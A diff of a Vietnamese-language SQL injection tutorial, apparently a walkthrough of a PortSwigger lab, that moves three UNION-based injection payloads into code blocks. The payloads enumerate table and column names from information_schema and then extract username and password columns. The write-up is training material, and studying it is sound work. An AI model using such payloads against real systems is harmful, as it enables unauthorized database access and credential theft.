@@ -17,7 +17,10 @@ Nhưng chúng ta không thể select * để lấy tất cả được vì sẽ 
 
 ![](/imgs/SQL-Injection/23.png?raw=true)
 
-Sau khi thực hiện truy vấn **' UNION SELECT table_name,NULL%20 FROM information_schema.tables--**
+Sau khi thực hiện truy vấn 
+```markdown
+**' UNION SELECT table_name,NULL%20 FROM information_schema.tables--**
+```
 
 ![](/imgs/SQL-Injection/24.png?raw=true)
 
@@ -30,14 +33,20 @@ Dựa theo [cheatsheet](https://portswigger.net/web-security/sql-injection/cheat
 > **SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'**
 
 Áp dụng vào
-> **' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name = 'users_tucmxy--**
+
+```markdown
+**' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name = 'users_tucmxy--**
+```
 
 Chúng ta sẽ thu được 2 trường **username_sxdvlv** và **password_pnxobl**
 
 ![](/imgs/SQL-Injection/25.png?raw=true)
 
 Chúng ta đã biết được tên các trường và tên bảng, tiến hành select ra data
-> **' UNION SELECT username_sxdvlv,password_pnxobl from users_tucmxy--**
+
+```markdown
+**' UNION SELECT username_sxdvlv,password_pnxobl from users_tucmxy--**
+```
 
 ![](/imgs/SQL-Injection/26.png?raw=true)
 
